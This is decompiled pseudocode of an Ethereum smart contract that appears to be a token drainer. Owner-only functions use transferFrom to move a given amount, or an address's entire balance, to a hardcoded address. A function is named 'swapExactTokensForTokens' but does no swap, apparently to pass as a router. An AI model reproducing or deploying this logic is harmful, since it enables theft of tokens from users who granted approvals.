contract main {




// =====================  Runtime code  =====================


address stor0;

function _fallback() payable {
    revert
}

function getApproval(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require stor0 == msg.sender
    require ext_code.size(arg1)
    call arg1.0xba2ebf96 with:
         gas gas_remaining wei
        args 0, 0, 0, address(arg2), this.address, address(this.address)
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function transferToken(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require stor0 == msg.sender
    require ext_code.size(arg2)
    call arg2.0x23b872dd with:
         gas gas_remaining wei
        args address(arg1), 0xeca33711c4db12473c2d473cc3320b43efdb5a4e, arg3
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function sub_9e3d8347(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == address(arg2)
    require stor0 == msg.sender
    require ext_code.size(address(arg2))
    staticcall address(arg2).0x70a08231 with:
            gas gas_remaining wei
           args address(arg1)
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_code.size(address(arg2))
    call address(arg2).0x23b872dd with:
         gas gas_remaining wei
        args address(arg1), 0xeca33711c4db12473c2d473cc3320b43efdb5a4e, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function swapExactTokensForTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) payable {
    require calldata.size - 4 >= 160
    require arg1 == arg1
    require arg2 == arg2
    require arg3 <= test266151307()
    require arg3 + 35 < calldata.size
    require arg3.length <= test266151307()
    require arg3 + (32 * arg3.length) + 36 <= calldata.size
    require arg4 == arg4
    require arg5 == arg5
    require tx.origin == stor0
    if arg3.length > test266151307():
        revert with 'NH{q', 65
    mem[96] = arg3.length
    if not arg3.length:
        if arg3.length < 1:
            revert with 'NH{q', 17
        if arg3.length - 1 >= arg3.length:
            revert with 'NH{q', 50
        mem[(32 * arg3.length - 1) + 128] = 0
        mem[(32 * arg3.length) + 128] = 32
        mem[(32 * arg3.length) + 160] = arg3.length
        mem[(32 * arg3.length) + 192 len 32 * arg3.length] = mem[128 len 32 * arg3.length]
    else:
        mem[128 len 32 * arg3.length] = call.data[calldata.size len 32 * arg3.length]
        if arg3.length < 1:
            revert with 'NH{q', 17
        if arg3.length - 1 >= arg3.length:
            revert with 'NH{q', 50
        mem[(32 * arg3.length - 1) + 128] = 0
        mem[(32 * arg3.length) + 128] = 32
        mem[(32 * arg3.length) + 160] = arg3.length
        mem[(32 * arg3.length) + 192 len 32 * arg3.length] = call.data[calldata.size len 32 * arg3.length]
    return memory
      from (32 * arg3.length) + 128
       len (96 * arg3.length) + 64
}



}
